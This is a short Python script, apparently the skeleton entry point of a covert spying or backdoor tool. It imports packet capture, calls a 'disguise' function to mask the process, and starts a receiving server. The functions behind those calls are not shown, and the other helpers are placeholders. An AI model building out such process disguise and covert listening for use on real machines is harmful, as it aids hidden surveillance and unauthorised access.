import socket
from struct import *
import pcapy
import sys
import psutil
import time
import threading
import signal

import config
import spyFunctions
import recvFunctions
# import sendFunctions
# import utils

running = True

def main(argv):
	arguments = checkArgs(argv)
	if (arguments != False):
		setConfig(arguments)
		spyFunctions.disguise()
		recvFunctions.startServer()
		try: 
			while(True):
				pass
		except (KeyboardInterrupt, SystemExit):
			running = False
			sys.exit()


def checkArgs(argv):
	if (len(argv) > 1):
		return True
	return True

def usage():
	print "usage"


def setConfig(args):
	print "setConfig"


if __name__ == "__main__":
	main(sys.argv)